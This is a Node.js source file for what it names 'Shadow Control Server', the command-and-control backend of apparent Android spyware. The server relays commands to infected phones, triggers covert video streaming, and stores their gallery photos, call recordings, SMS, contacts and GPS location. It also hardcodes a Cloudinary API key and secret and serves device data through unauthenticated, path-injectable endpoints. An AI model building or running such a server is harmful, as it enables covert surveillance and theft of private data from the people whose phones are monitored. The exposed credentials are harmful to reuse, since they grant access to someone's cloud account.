const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2;
const http = require('http'); 
const { Server } = require("socket.io");
const compression = require('compression'); 

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

// ==================================================
// ✅ 1. OPTIMIZED SOCKET.IO SETUP
// ==================================================
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    maxHttpBufferSize: 1e8, // 100MB
    pingTimeout: 60000,     
    pingInterval: 25000,    
    transports: ['websocket', 'polling']
});

// --- CLOUDINARY CONFIG ---
cloudinary.config({
    cloud_name: 'dxnh5vuik',
    api_key: '185953318184881',
    api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
});

// --- SETUP & MIDDLEWARE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(compression()); 
app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
app.use(express.static(__dirname));

// Live Status (RAM Storage)
let devicesStatus = {}; 

// ==================================================
//  🔥 MAIN SOCKET LOGIC (FIXED & UNIFIED)
// ==================================================
io.on('connection', (socket) => {
    
    console.log(`👤 New Connection ID: ${socket.id}`);

    // ✅ FIX: Unified Room Joining (Case Insensitive)
    const handleJoin = (roomID) => {
        if (!roomID) return;
        const cleanRoom = roomID.toString().trim().toUpperCase();
        socket.join(cleanRoom);
        console.log(`🔌 Client/Device Joined Room: ${cleanRoom}`);
    };

    socket.on('join', handleJoin);
    socket.on('join-room', handleJoin);

    // ✅ WebRTC SIGNALING RELAY (Crucial for Video)
    // Using io.to().emit to ensure the message reaches the target room correctly
    socket.on("offer", (data) => {
        if (!data.target) return;
        const target = data.target.toString().trim().toUpperCase();
        console.log(`📡 Relaying Offer to: ${target}`);
        io.to(target).emit("offer", data.offer || data);
    });

    socket.on("answer", (data) => {
        if (!data.target) return;
        const target = data.target.toString().trim().toUpperCase();
        console.log(`📡 Relaying Answer to: ${target}`);
        io.to(target).emit("answer", data.answer || data);
    });

    socket.on("candidate", (data) => {
        if (!data.target) return;
        const target = data.target.toString().trim().toUpperCase();
        io.to(target).emit("candidate", data.candidate || data);
    });

    // ✅ FIX: Enhanced Control Events
    socket.on('control-event', (data) => {
        if (!data.room) return;
        const room = data.room.toString().trim().toUpperCase();
        console.log(`🎮 Action: ${data.action} -> Room: ${room}`);
        
        // Agar dashboard se 'start' click ho, toh Android ko auto-command jaye
        if (data.action === 'start') {
            io.to(room).emit('command', 'start_stream');
        }
        io.to(room).emit('control-event', data); 
    });

    // Standard Command Handling
    socket.on('send-command', (data) => {
        const target = (data.targetId || data.deviceId || "").toString().trim().toUpperCase();
        if (target && data.command) {
            console.log(`⚡ Command: ${data.command} -> ${target}`);
            io.to(target).emit('command', data.command);
            
            if (!devicesStatus[target]) devicesStatus[target] = { id: target };
            devicesStatus[target].command = data.command;
        }
    });

    socket.on('disconnect', () => { 
        console.log(`❌ Disconnected: ${socket.id}`);
    });
});



// ==================================================
//  ✅ API ENDPOINTS (ALL FEATURES)
// ==================================================

app.get('/', (req, res) => {
    res.send('✅ Shadow Control Server v3.0: Online & Optimized');
});

// UPLOAD IMAGE/GALLERY
app.post('/api/upload-image', (req, res) => {
    let { device_id, image_data, type } = req.body; 
    if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });
    const id = device_id.toString().trim().toUpperCase();
    
    let folderName = "gallery"; 
    let publicId = Date.now().toString(); 

    if (type && type.includes("-")) {
        const parts = type.split("-"); 
        folderName = parts[0];  
        publicId = parts[1];    
    } else if (type && type !== "null" && type !== "") {
        folderName = type;
    }

    let folderPath = `${id}/${folderName}`; 
    let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;

    cloudinary.uploader.upload(base64Image, { 
        folder: folderPath, 
        public_id: publicId, 
        resource_type: "image", 
        width: 1280, 
        quality: "auto" 
    }, (error, result) => {
        if (error) return res.status(500).json({ error: "Upload Failed" });
        io.emit('new-file', { device_id: id, url: result.secure_url, type: folderName });
        res.json({ status: "success", url: result.secure_url });
    });
});

// AUDIO UPLOAD
app.post('/api/upload-audio', (req, res) => {
    let { device_id, audio_data, filename } = req.body; 
    if (!device_id || !audio_data) return res.status(400).json({ error: "No Data" });
    const id = device_id.toString().trim().toUpperCase();
    
    let folderPath = `${id}/calls`; 
    let base64Audio = audio_data.startsWith('data:audio') ? audio_data : "data:audio/mp4;base64," + audio_data;

    cloudinary.uploader.upload(base64Audio, { 
        folder: folderPath, 
        public_id: filename || Date.now().toString(), 
        resource_type: "video" 
    }, (error, result) => {
        if (error) return res.status(500).json({ error: "Upload Failed" });
        io.emit('new-audio', { device_id: id, url: result.secure_url, name: filename });
        res.json({ status: "success", url: result.secure_url });
    });
});

// STATUS POLLING
app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
        if (!device_id) return res.status(400).json({ error: "No ID" });
        const id = device_id.toString().trim().toUpperCase();
        
        if (!devicesStatus[id]) devicesStatus[id] = { id: id, command: "none" };
        devicesStatus[id] = {
            ...devicesStatus[id],
            model: model || "Unknown",
            battery: battery || level || 0,
            version: version || "--",
            charging: (String(charging) === "true"),
            lat: lat || 0,
            lon: lon || 0,
            lastSeen: Date.now()
        };

        let cmd = devicesStatus[id].command || "none";
        devicesStatus[id].command = "none"; 
        res.json({ status: "success", command: cmd });
    } catch (e) { res.status(500).json({ error: "Error" }); }
});

// DATA STORAGE (SMS, CONTACTS, ETC)
app.post('/api/upload_data', async (req, res) => { 
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let finalData = typeof data === 'string' ? JSON.parse(data) : data;
        // Basic array wrap for consistency
        if (!Array.isArray(finalData)) finalData = [finalData];

        await fs.promises.writeFile(filePath, JSON.stringify(finalData, null, 2));
        res.json({ status: "success" });
    } catch (error) { res.status(500).json({ status: "error" }); }
});

// GET DATA API
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

// ADMIN API
app.get('/api/admin/all-devices', (req, res) => res.json(devicesStatus));

app.post('/api/send-command', (req, res) => {
    let { device_id, deviceId, command } = req.body;
    let target = (device_id || deviceId || "").toString().trim().toUpperCase();
    if (!target) return res.status(400).json({ error: "No target" });
    
    io.to(target).emit('command', command);
    if (!devicesStatus[target]) devicesStatus[target] = { id: target };
    devicesStatus[target].command = command;
    res.json({ status: "success", sentTo: target });
});

server.listen(PORT, () => console.log(`🚀 SERVER RUNNING ON PORT ${PORT}`));
